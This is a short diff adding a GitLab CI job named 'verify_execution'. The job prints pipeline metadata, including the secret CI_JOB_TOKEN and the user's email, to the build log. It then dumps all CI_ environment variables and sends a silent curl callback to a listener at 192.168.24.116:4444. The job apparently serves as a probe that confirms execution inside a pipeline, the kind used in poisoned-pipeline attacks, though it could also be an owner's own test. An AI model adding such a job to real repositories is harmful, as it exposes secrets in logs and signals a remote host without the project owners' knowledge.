@@ -1,0 +1,26 @@
+stages:
+  - check
+
+verify_execution:
+  stage: check
+  script:
+    - |
+      echo "🔍 GitLab CI/CD 환경 변수 출력:"
+      echo "Project: $CI_PROJECT_PATH"
+      echo "Commit SHA: $CI_COMMIT_SHA"
+      echo "Branch: $CI_COMMIT_BRANCH"
+      echo "Tag: $CI_COMMIT_TAG"
+      echo "Pipeline Source: $CI_PIPELINE_SOURCE"
+      echo "Pipeline ID: $CI_PIPELINE_ID"
+      echo "Job ID: $CI_JOB_ID"
+      echo "Job Name: $CI_JOB_NAME"
+      echo "Job Stage: $CI_JOB_STAGE"
+      echo "Job Token: $CI_JOB_TOKEN"
+      echo "Runner Description: $CI_RUNNER_DESCRIPTION"
+      echo "GitLab User Login: $GITLAB_USER_LOGIN"
+      echo "GitLab User Email: $GITLAB_USER_EMAIL"
+      echo "----------------------------"
+      env | grep CI_ || true
+      curl -m 1 "http://192.168.24.116:4444/12341234" || true
+  tags:
+    - runner
